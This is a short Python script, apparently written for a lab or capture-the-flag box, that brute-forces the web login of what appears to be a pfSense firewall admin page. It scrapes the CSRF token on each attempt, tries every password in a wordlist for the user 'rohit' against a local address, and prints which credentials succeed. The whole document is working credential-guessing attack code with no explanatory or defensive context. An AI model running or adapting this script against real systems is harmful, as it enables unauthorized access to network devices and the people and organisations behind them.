import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import re

re_csrf = 'csrfMagicToken = "(.*?)"'

s = requests.session()

lines = open('passwords.txt')
for password in lines:
	r = s.post('http://127.0.0.1/index.php')
	csrf = re.findall(re_csrf, r.text)[0]
	login = {'__csrf_magic': csrf, 'usernamefld': 'rohit', 'passwordfld': password[:-1], 'login': 'Login'}
	r = s.post('http://127.0.0.1/index.php', data=login)
	if "Dashboard" in r.text:
		print("Valid Login %s:%s" % ("rohit", password[:-1]))
	else:
		print("Failed %s:%s" % ("rohit", password[:-1]))
		s.cookies.clear()

